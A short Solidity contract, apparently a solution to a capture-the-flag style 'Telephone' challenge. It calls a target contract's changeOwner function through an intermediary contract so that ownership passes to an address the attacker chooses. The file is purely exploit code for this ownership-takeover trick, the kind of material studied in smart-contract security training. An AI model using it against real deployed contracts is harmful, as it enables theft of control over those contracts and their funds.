// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract TelephoneAttacker {

    constructor() {}

    function attack(address telephone, address newOwner) external payable {
        (bool success, ) = telephone.call(
            abi.encodeWithSignature("changeOwner(address)", newOwner)
        );
        require(success);
    }
}